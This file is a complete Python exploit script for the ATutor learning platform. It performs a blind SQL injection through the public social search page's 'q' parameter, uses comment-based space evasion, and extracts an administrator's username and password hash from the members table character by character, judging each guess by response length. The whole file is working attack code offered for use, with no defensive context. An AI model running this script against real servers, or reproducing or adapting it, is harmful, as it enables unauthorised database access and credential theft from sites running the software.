import requests
import sys

def searchFriends_sqli(ip, injection_string):
    #32 to 126 is the printable characters in the ASCII table
    for j in range(32,126):
        target="http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, injection_string.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j 

    return None

def inject(r, inj, ip):
    extracted = ""
    
    for i in range(1, r):
        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (inj,i)
        retrieved_value = searchFriends_sqli(ip, injection_string)

        if (retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            print ("\n[+] Done!")
            break

    return extracted

def main():
    if len(sys.argv) != 2:
        print ("(+) usage: %s <target>") % sys.argv[0]
        print ("(+) eg: %s 192.168.211.203") % sys.argv[0]
        sys.exit(-1)

    ip = sys.argv[1]

    print ("[+] Retrieving username...")
    query = "select/**/login/**/from/**/AT_members/**/WHERE/**/status=3/**/limit/**/1"
    username = inject(50, query, ip)

    print ("[+] Retrieving password hash...")
    query = "select/**/password/**/from/**/AT_members/**/WHERE/**/login=\'%s\'/**/limit/**/1" % (username)
    password = inject(50,query,ip)

    print ("[+] Credentials are: %s:%s" % (username, password))
    print ("\n[+] done")

if __name__ == "__main__":
    main()
